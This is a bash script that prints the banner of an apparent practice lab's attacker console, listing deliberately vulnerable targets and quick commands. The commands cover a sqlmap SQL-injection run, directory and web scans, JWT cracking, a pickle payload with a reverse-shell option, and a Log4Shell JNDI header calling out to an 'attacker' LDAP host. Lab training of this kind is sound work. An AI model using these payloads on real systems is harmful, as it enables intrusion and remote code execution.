#!/bin/bash
cat << 'EOF'

  ╔══════════════════════════════════════════════════════════╗
  ║           🎯  VulnLab v3.0 — Attacker Console           ║
  ╠══════════════════════════════════════════════════════════╣
  ║  타겟                                                    ║
  ║   vuln-app   → http://vuln-app:5000    (취약점 13종)     ║
  ║   dvwa       → http://dvwa:80                            ║
  ║   webgoat    → http://webgoat:8080/WebGoat               ║
  ║   juice-shop → http://juice-shop:3000                    ║
  ║   log4shell  → http://log4shell:8080   (Log4j RCE)       ║
  ╠══════════════════════════════════════════════════════════╣
  ║  빠른 명령어                                              ║
  ║   sqlmap -u "http://vuln-app:5000/sqli/login"            ║
  ║     --data "username=a&password=b" --dbs --batch         ║
  ║   nikto -h http://dvwa                                   ║
  ║   gobuster dir -u http://juice-shop:3000                 ║
  ║     -w /usr/share/wordlists/common.txt                   ║
  ╠══════════════════════════════════════════════════════════╣
  ║  커스텀 스크립트 (/workspace/scripts/)                    ║
  ║   python3 scripts/jwt_attack.py --token <JWT>            ║
  ║   python3 scripts/jwt_attack.py --crack <JWT>            ║
  ║   python3 scripts/pickle_payload.py --cmd "id"           ║
  ║   python3 scripts/pickle_payload.py --rev "IP:4444"      ║
  ╠══════════════════════════════════════════════════════════╣
  ║  Log4Shell 테스트                                        ║
  ║   curl -H 'X-Api-Version: ${jndi:ldap://attacker/a}'    ║
  ║        http://log4shell:8080                             ║
  ╚══════════════════════════════════════════════════════════╝

EOF
